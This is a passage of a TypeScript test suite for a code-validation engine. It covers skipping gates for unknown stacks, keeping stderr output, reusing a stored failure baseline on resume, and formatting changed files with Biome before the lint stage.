  beforeEach(() => {
    tempDir = createTempDir('val-unknown-stack');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('unknown stack never spawns npm', async () => {
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({ typecheck: true, lint: true, test: true });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus,
      phase: 'implementing',
    });

    expect(runner.calls).toEqual([]);
    expect(results.map((r) => [r.stage, r.skipped, r.output])).toEqual([
      ['typecheck', true, 'skipped typecheck: no typecheck command for an unrecognised stack'],
      ['lint', true, 'skipped lint: no lint command for an unrecognised stack'],
      ['test', true, 'skipped test: no test command for an unrecognised stack'],
    ]);
    const warnings = events.filter((e): e is EngineEventOf<'warning'> => e.type === 'warning');
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({ category: 'validation', code: 'no_gates_unknown_stack' });
  });
});

describe('capture and baseline reuse', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-capture');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  it('green stage keeps stderr tail', async () => {
    const runner = makeCommandRunner({
      stdout: 'checked 12 files',
      stderr: 'warning: 1 deprecated rule',
      code: 0,
    });
    const validator = createValidator({ runCommand: runner });
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: false,
      test: false,
    });

    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(results[0]?.passed).toBe(true);
    expect(results[0]?.output).toContain('checked 12 files');
    expect(results[0]?.output).toContain('warning: 1 deprecated rule');
  });

  it('baseline is reused on resume', async () => {
    const config = makeConfig({
      typecheck: true,
      typecheckCommand: 'npm run typecheck',
      lint: false,
      test: false,
    });
    const priorFailure = 'src/app.ts(12,5): error TS2322: Type mismatch';
    const probeRunner = makeCommandRunner(
      processError.exitCode({ command: 'tsc', code: 1, stderr: priorFailure, output: '' }),
    );
    const probed = await createValidator({
      runCommand: probeRunner,
      captureBaseline: true,
    }).primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(probeRunner.calls).toHaveLength(1);
    expect(probed).toEqual({
      failingStages: ['typecheck'],
      commands: { typecheck: 'npm run typecheck' },
      failures: { typecheck: ['src/app.ts(12,5)'] },
    });

    const persistedBaseline = ValidationBaselineSchema.parse(JSON.parse(JSON.stringify(probed)));
    const resumeRunner = makeCommandRunner();
    const resumed = createValidator({ runCommand: resumeRunner, captureBaseline: true });
    const reprimed = await resumed.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config,
      bus: fakeBus,
      phase: 'implementing',
      persistedBaseline,
    });

    expect(resumeRunner.calls).toEqual([]);
    expect(reprimed).toEqual(persistedBaseline);
    expect(
      resumed.decideAcceptance({
        results: [
          {
            passed: false,
            stage: 'typecheck',
            command: 'npm run typecheck',
            error: priorFailure,
            failureFiles: [],
          },
        ],
        changedFiles: ['src/app.ts'],
      }).exemptStages,
    ).toEqual(['typecheck']);
    expect(
      resumed.decideAcceptance({
        results: [
          {
            passed: false,
            stage: 'typecheck',
            command: 'npm run typecheck',
            error: 'src/other.ts(3,1): error TS2551: Unknown name',
            failureFiles: [],
          },
        ],
        changedFiles: ['src/app.ts'],
      }).blockingStages,
    ).toEqual(['typecheck']);
  });
});
describe('formatting the changed files before the lint stage', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir('val-format');
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  const lintOnly = makeConfig({ typecheck: false, lint: true, test: false });

  it("formats the brief's changed files before the lint command runs", async () => {
    writeTsProject(tempDir);
    writeFileSync(join(tempDir, 'biome.json'), '{}');
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });

    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config: lintOnly,
      bus: fakeBus,
      phase: 'implementing',
      changedFiles: ['src/app.ts', 'README.md'],
    });

    expect(runner.calls.map((call) => [call.cmd, ...call.args].join(' '))).toEqual([
      'npx biome format --write src/app.ts',
      'npx biome check .',
    ]);
    expect(results.map((r) => [r.stage, r.passed])).toEqual([['lint', true]]);
  });

  it('runs no formatter when the project has only a lint config', async () => {
    writeTsProject(tempDir);
    writeFileSync(join(tempDir, '.eslintrc.json'), '{}');
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner });

    await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config: lintOnly,
      bus: fakeBus,
      phase: 'implementing',
      changedFiles: ['src/app.ts'],
    });

    expect(runner.calls.map((call) => [call.cmd, ...call.args].join(' '))).toEqual([
      'npx eslint .',
    ]);
  });

  it('warns once and lints anyway when the formatter exits non-zero', async () => {
    writeTsProject(tempDir);
    writeFileSync(join(tempDir, 'biome.json'), '{}');
    const runner = makeCommandRunner(
      processError.exitCode({
        command: 'npx biome format --write src/app.ts',
        code: 1,
        stderr: 'unparseable source',
        output: '',
      }),
      { stdout: 'ok', stderr: '', code: 0 },
    );
    const validator = createValidator({ runCommand: runner });
    const events: EngineEvent[] = [];
    const bus = createEventBus();
    bus.subscribe((event) => events.push(event));

    const results = await validator.runValidation({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config: lintOnly,
      bus,
      phase: 'implementing',
      changedFiles: ['src/app.ts'],
    });

    expect(runner.calls.map((call) => [call.cmd, ...call.args].join(' '))).toEqual([
      'npx biome format --write src/app.ts',
      'npx biome check .',
    ]);
    const warnings = events.filter((e): e is EngineEventOf<'warning'> => e.type === 'warning');
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({
      category: 'validation',
      code: 'validation_format_failed',
    });
    expect(results.find((r) => r.stage === 'lint')?.passed).toBe(true);
  });

  it('never formats during the baseline probe', async () => {
    writeTsProject(tempDir);
    writeFileSync(join(tempDir, 'biome.json'), '{}');
    const runner = makeCommandRunner();
    const validator = createValidator({ runCommand: runner, captureBaseline: true });

    await validator.primeBaseline({
      task: mkTask('src/app.ts'),
      projectDir: tempDir,
      config: lintOnly,
      bus: fakeBus,
      phase: 'implementing',
    });

    expect(runner.calls.map((call) => [call.cmd, ...call.args].join(' '))).toEqual([
      'npx biome check .',
    ]);
  });
});
